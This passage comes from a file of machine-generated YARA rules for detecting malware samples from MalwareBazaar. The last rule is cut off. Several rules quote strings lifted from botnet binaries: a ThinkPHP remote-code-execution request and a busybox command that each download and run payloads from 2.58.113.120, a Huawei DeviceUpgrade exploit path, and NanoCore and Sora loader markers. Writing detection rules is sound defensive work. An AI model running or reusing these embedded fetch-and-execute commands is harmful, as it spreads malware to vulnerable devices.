        description = "Auto ML: 9ae1049e0579fd8ef08a03d050571ff770d1c8957ddbf210e3257dd88e08c23d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4009KB and
        all of them
}

rule Linux_9ae234670945c73560b0657fb56b460ba43e2c5f3f22c8d23ce31282fcebe9da
{
    meta:
        description = "Auto ML: 9ae234670945c73560b0657fb56b460ba43e2c5f3f22c8d23ce31282fcebe9da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB and
        all of them
}

rule Linux_9afb075e67fe444d1b21264917f57c74b90784d3ef938d7f8a03ef0f6c4ee908
{
    meta:
        description = "Auto ML: 9afb075e67fe444d1b21264917f57c74b90784d3ef938d7f8a03ef0f6c4ee908"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB and
        all of them
}

rule Windows_9b631808752d97a24c25c81b99a8739ff79b3a5689aeb4e5e9a9068d155e8009
{
    meta:
        description = "Auto ML: 9b631808752d97a24c25c81b99a8739ff79b3a5689aeb4e5e9a9068d155e8009"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = "CLRCreateInstance"
        $s17 = "CreateFullTrustSandbox"
        $s18 = ".text$di"
        $s19 = ".text$mn"
        $s20 = ".text$mn$00"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1062KB and
        all of them
}

rule Linux_9b6ca9302542ce0c4a7c4990b8cdce4c9e441c5ced457fc70f0746bf11ae3b84
{
    meta:
        description = "Auto ML: 9b6ca9302542ce0c4a7c4990b8cdce4c9e441c5ced457fc70f0746bf11ae3b84"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 128KB and
        all of them
}

rule Windows_9b7e70464f16dfdd9a7a84ff0f800de46c8f9a791da677e3abc1c4fbab2d7b59
{
    meta:
        description = "Auto ML: 9b7e70464f16dfdd9a7a84ff0f800de46c8f9a791da677e3abc1c4fbab2d7b59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "NanoCore Client.exe"
        $s6 = "System.Windows.Forms"
        $s7 = "System"
        $s8 = "System.Drawing"
        $s9 = "kernel32.dll"
        $s10 = "psapi.dll"
        $s11 = "advapi32.dll"
        $s12 = "ntdll.dll"
        $s13 = "dnsapi.dll"
        $s14 = "ClientLoaderForm.resources"
        $s15 = "User"
        $s16 = "Microsoft.VisualBasic.CompilerServices"
        $s17 = "StandardModuleAttribute"
        $s18 = "HideModuleNameAttribute"
        $s19 = "Registry"
        $s20 = "Microsoft.Win32"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Windows_9b916aa3c1b65d602687cee9bdf576ec4c9d163f4481a96ca7d5be486433e09b
{
    meta:
        description = "Auto ML: 9b916aa3c1b65d602687cee9bdf576ec4c9d163f4481a96ca7d5be486433e09b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_DataTable1"
        $s5 = "get_DataColumn1"
        $s6 = "set_DataColumn1"
        $s7 = "DataSet1"
        $s8 = "get_DataColumn2"
        $s9 = "set_DataColumn2"
        $s10 = "get_DataColumn3"
        $s11 = "set_DataColumn3"
        $s12 = "get_DataColumn4"
        $s13 = "set_DataColumn4"
        $s14 = "get_DataColumn5"
        $s15 = "set_DataColumn5"
        $s16 = "<Module>"
        $s17 = "System.Drawing.Drawing2D"
        $s18 = "get_SizeWE"
        $s19 = "System.IO"
        $s20 = "get_SizeNS"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2148KB and
        all of them
}

rule Linux_9baddc1daef234f76768be8624815532ec29f4cb0c405f291aea9f4c25a22bc6
{
    meta:
        description = "Auto ML: 9baddc1daef234f76768be8624815532ec29f4cb0c405f291aea9f4c25a22bc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 76KB and
        all of them
}

rule Windows_011c45deea7f50338e56529fb8705caa6e86b3920e7f4f79926bcb7933ffa0ba
{
    meta:
        description = "Auto ML: 011c45deea7f50338e56529fb8705caa6e86b3920e7f4f79926bcb7933ffa0ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 100KB and
        all of them
}

rule Windows_0ffa40fa3e03834a51250698ff4352b0702268583249b2d4cf07556c8b7ed3af
{
    meta:
        description = "Auto ML: 0ffa40fa3e03834a51250698ff4352b0702268583249b2d4cf07556c8b7ed3af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ik.PowerShell"
        $s6 = "UserPwd"
        $s7 = "ReadKeyBox"
        $s8 = "FileType"
        $s9 = "System"
        $s10 = "System.Management.Automation"
        $s11 = "System.Management.Automation.Host"
        $s12 = "PSHostRawUserInterface"
        $s13 = "System.Windows.Forms"
        $s14 = "PSHostUserInterface"
        $s15 = "System.Text"
        $s16 = "pszMessageText"
        $s17 = "VALIDATE_USERNAME"
        $s18 = "COMPLETE_USERNAME"
        $s19 = "USERNAME_TARGET_CREDENTIALS"
        $s20 = "KEEP_USERNAME"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 211KB and
        all of them
}

rule Windows_9bf63272d2a6c62609953b695956eaed4a5496159dc17dd9617d9f1bd37e0be9
{
    meta:
        description = "Auto ML: 9bf63272d2a6c62609953b695956eaed4a5496159dc17dd9617d9f1bd37e0be9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6256KB and
        all of them
}

rule Windows_9c6536ae2b9588bf5dada49dc918a668a204e0903fc091bf1a5ebaacb9b5559f
{
    meta:
        description = "Auto ML: 9c6536ae2b9588bf5dada49dc918a668a204e0903fc091bf1a5ebaacb9b5559f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1208KB and
        all of them
}

rule Windows_9c6d3d24482d750aa59531f45f94824231335167787b248ac5a4cad5e3bb387e
{
    meta:
        description = "Auto ML: 9c6d3d24482d750aa59531f45f94824231335167787b248ac5a4cad5e3bb387e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4700KB and
        all of them
}

rule Windows_9c7844e137bd630f22e7d487c43be450d9c185ea7339230bef46d2decb817d4d
{
    meta:
        description = "Auto ML: 9c7844e137bd630f22e7d487c43be450d9c185ea7339230bef46d2decb817d4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6341KB and
        all of them
}

rule Windows_9c98f0f798b53d28919e7c8f7331619c509e24045d1f4dd192f86f2a6115d483
{
    meta:
        description = "Auto ML: 9c98f0f798b53d28919e7c8f7331619c509e24045d1f4dd192f86f2a6115d483"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Linux_9cc3f85bf7ed1c4470c3b21f0b4c74ecd5520d5365952400983c9b6031c9e20f
{
    meta:
        description = "Auto ML: 9cc3f85bf7ed1c4470c3b21f0b4c74ecd5520d5365952400983c9b6031c9e20f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_9cd9f4e29036513f892a86b7bf96dfd7fc9815c12ca23eb81ca0b4c6926fa235
{
    meta:
        description = "Auto ML: 9cd9f4e29036513f892a86b7bf96dfd7fc9815c12ca23eb81ca0b4c6926fa235"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Resources"
        $s14 = "plan_by_calendar_and_month.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6345KB and
        all of them
}

rule Linux_9d39be5e762c98d20fb5de96615e2935d011a14d37fad8334bcab76b2293bcfd
{
    meta:
        description = "Auto ML: 9d39be5e762c98d20fb5de96615e2935d011a14d37fad8334bcab76b2293bcfd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB and
        all of them
}

rule Linux_9d758c942e12cc5939473e7fb9f57482e3888494aeaae4f7ba353f3c282f24cf
{
    meta:
        description = "Auto ML: 9d758c942e12cc5939473e7fb9f57482e3888494aeaae4f7ba353f3c282f24cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 102KB and
        all of them
}

rule Windows_9db60b72564e40228aca83cb722774dab5989a5dc6349b5cddb276c0b4facbcd
{
    meta:
        description = "Auto ML: 9db60b72564e40228aca83cb722774dab5989a5dc6349b5cddb276c0b4facbcd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB and
        all of them
}

rule Windows_101b9564ba11aa44372b37b1143eac0d5dd1e3f38c6a35517de843b9f23b3704
{
    meta:
        description = "Auto ML: 101b9564ba11aa44372b37b1143eac0d5dd1e3f38c6a35517de843b9f23b3704"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "nbeffd.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "GetString"
        $s8 = "System.IO"
        $s9 = "ModuleHandle"
        $s10 = "System.Collections.Generic"
        $s11 = "System.Management"
        $s12 = "System.Reflection"
        $s13 = "CreateMemberRefsDelegates"
        $s14 = "CreateGetStringDelegate"
        $s15 = "System.Security.Cryptography"
        $s16 = "System.Security"
        $s17 = "System.Runtime.CompilerServices"
        $s18 = "AssemblyFileVersionAttribute"
        $s19 = "AttributeTargets"
        $s20 = "GetInstances"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15775KB and
        all of them
}

rule Windows_9dfb6b41c90732c9206ef6f65a941b1061126ead69e3715d79519196dad5899c
{
    meta:
        description = "Auto ML: 9dfb6b41c90732c9206ef6f65a941b1061126ead69e3715d79519196dad5899c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 688KB and
        all of them
}

rule Linux_9e3a90d55876cfb63c8aba18224530badf9b1747e4f4c9ceb5ce776f86b0c3c2
{
    meta:
        description = "Auto ML: 9e3a90d55876cfb63c8aba18224530badf9b1747e4f4c9ceb5ce776f86b0c3c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
